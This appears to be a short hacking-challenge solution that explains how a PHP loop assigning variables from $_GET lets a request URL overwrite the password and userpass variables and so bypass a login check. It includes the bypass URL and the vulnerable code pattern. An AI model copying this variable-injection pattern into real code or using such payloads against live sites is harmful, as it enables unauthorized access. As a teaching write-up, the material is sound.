=== Solution ===
<pre>moo.com/index.php?password=x&userpass=x</pre>

=== Explanation ===
The hack is done in the following code :
<pre>
foreach ($_GET as $key => $value)
        { 
          $$key = $value; 
        }

</pre>
$_GET is an array and basically this code means :
 ${$key} = $value for each value you put in $_GET
So if you put in
 $_GET password=x and userpass=x
you'll have:
 $_GET[password]=x and $_GET[userpass]=x
and the foreach will do
 $password=x;
 $userpass=x;
and we will have 
 $userpass == $password
